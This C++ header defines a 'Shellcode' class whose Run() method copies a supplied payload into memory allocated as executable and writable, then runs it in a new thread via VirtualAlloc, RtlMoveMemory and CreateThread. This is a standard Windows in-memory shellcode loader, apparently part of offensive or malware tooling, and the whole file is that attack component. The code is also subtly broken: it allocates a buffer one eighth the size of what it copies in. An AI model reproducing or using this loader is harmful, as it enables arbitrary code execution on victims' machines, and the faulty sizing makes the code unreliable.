#pragma once
#include "payload.h"

namespace Reader {
    class Shellcode : Payload {
    public:
        int payload_bits;

        Shellcode() : Payload() {}
        Shellcode(char * p, int pb) : Payload(p) {
            payload_bits = pb;
        }

        void Run() {
            int payload_len = strlen(payload);

            LPVOID ptr = VirtualAlloc(0, payload_bits / 8, 0x3000, 0x40);
            RtlMoveMemory(ptr, payload, payload_bits);


            CreateThread(
                NULL,
                0,
                (LPTHREAD_START_ROUTINE)ptr,
                NULL,
                0,
                0
            );

            Sleep(2000);
        }
    };
}

